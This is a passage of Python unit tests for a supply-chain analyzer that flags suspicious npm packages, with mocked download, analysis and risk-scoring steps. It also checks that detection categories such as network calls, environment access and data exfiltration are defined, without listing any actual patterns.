    @patch.object(SupplyChainAnalyzer, "_score_package_risk")
    def test_analyze_package_behavior_full_workflow_suspicious(
        self, mock_score, mock_analyze, mock_download
    ):
        """Test full package analysis workflow for suspicious package"""
        mock_download.return_value = True
        mock_analyze.return_value = {
            "suspicious": True,
            "threats": ["network_call", "process_spawn"],
            "evidence": ["Suspicious network call", "Process spawning"],
            "patterns_found": {},
        }
        mock_score.return_value = 55

        result = self.analyzer.analyze_package_behavior("malicious-pkg", "npm")

        assert result is not None
        assert result["suspicious"] is True
        assert result["risk_score"] == 55
        assert len(result["threats"]) == 2
        assert mock_score.called

    @patch.object(SupplyChainAnalyzer, "_download_package")
    def test_analyze_package_behavior_download_failure(self, mock_download):
        """Test package analysis when download fails"""
        mock_download.return_value = False

        result = self.analyzer.analyze_package_behavior("nonexistent", "npm")

        assert result is None

    def test_suspicious_patterns_defined(self):
        """Test that suspicious patterns are defined"""
        assert hasattr(self.analyzer, "SUSPICIOUS_PATTERNS")
        patterns = self.analyzer.SUSPICIOUS_PATTERNS

        assert "network_call" in patterns
        assert "file_access" in patterns
        assert "env_access" in patterns
        assert "process_spawn" in patterns
        assert "crypto_mining" in patterns
        assert "data_exfil" in patterns
        assert "obfuscation" in patterns

        # Each category should have patterns
        for category, pattern_list in patterns.items():
            assert isinstance(pattern_list, list)
            assert len(pattern_list) > 0
